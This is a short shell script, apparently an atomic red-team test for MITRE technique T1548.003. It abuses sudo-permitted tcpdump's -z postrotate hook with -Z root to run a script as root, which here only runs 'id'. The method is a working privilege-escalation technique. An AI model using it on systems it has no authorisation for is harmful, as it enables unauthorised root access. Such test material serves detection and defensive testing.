printf '#!/bin/sh\nid\n' > /tmp/T1548.003_tcpdump_postrotate.sh
chmod +x /tmp/T1548.003_tcpdump_postrotate.sh
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/T1548.003_tcpdump_postrotate.sh -Z root &
TCPDUMP_PID=$!
sleep 1
ping -c 3 127.0.0.1 > /dev/null 2>&1
sleep 3
sudo kill "$TCPDUMP_PID" > /dev/null 2>&1 || true
